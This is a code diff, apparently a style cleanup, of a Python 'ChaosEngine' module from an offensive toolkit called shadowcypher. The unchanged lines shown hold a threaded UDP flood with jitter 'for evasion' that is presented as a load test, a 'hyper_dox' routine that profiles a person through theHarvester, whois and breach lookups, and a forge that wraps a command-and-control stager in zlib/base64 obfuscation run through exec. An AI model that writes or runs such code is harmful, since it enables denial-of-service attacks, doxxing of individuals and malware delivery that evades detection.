@@ -4,11 +4,13 @@ Supports: UDP_FLUX, HTTP_SYN_FLOOD, ICMP_BURST.
 """
 
 import os
-import socket
 import random
+import socket
 import threading
 import time
+
 from shadowcypher.core.logger import logger
+
 
 class ChaosEngine:
     def __init__(self):
@@ -19,7 +21,7 @@ class ChaosEngine:
         """Orchestrate a UDP Flux load test with Evasive Jitter."""
         self.active = True
         logger.info("chaos", f"SOVEREIGN_FLUX: Initiating UDP Load on {target_ip}:{target_port}")
-        
+
         def flood():
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             end_time = time.time() + duration
@@ -31,7 +33,7 @@ class ChaosEngine:
                         time.sleep(0.01) # Jitter for evasion
                 except Exception:
                     pass
-        
+
         for _ in range(threads):
             t = threading.Thread(target=flood, daemon=True)
             t.start()
@@ -40,6 +42,7 @@ class ChaosEngine:
     def hyper_dox(self, identity, on_output=None):
         """OSINT correlation: runs theHarvester + whois + breach lookup for identity."""
         import shutil
+
         from shadowcypher.core.runner import runner
         if on_output: on_output(f"[OSINT] IDENTITY_CORRELATION: {identity}\n")
         if shutil.which("theHarvester"):
@@ -57,22 +60,24 @@ class ChaosEngine:
 
     def mutating_payload_forge(self, lhost, lport, on_output=None):
         """Generate a stager that re-obfuscates its core via a zlib/base64 mutation wrapper."""
-        import zlib, base64
+        import base64
+        import zlib
+
         from shadowcypher.modules.payload_factory import PayloadFactory
         if on_output: on_output("[CHAOS] FORGING_MUTATING_STAGER...\n")
-        
+
         path = PayloadFactory.generate_stealth_c2_python(lhost, lport)
         with open(path, "rb") as f:
             original = f.read()
-            
+
         # Recursive Mutation Wrapper
         b64_data = base64.b64encode(zlib.compress(original)).decode()
         wrapper = f"import zlib,base64; exec(zlib.decompress(base64.b64decode('{b64_data}')))"
-        
+
         mutant_path = path.replace(".py", "_mutant.py")
         with open(mutant_path, "w") as f:
             f.write(wrapper)
-            
+
         if on_output: on_output(f"[SUCCESS] MUTANT_WEAPON_FORGED: {mutant_path}\n")
         return mutant_path
 
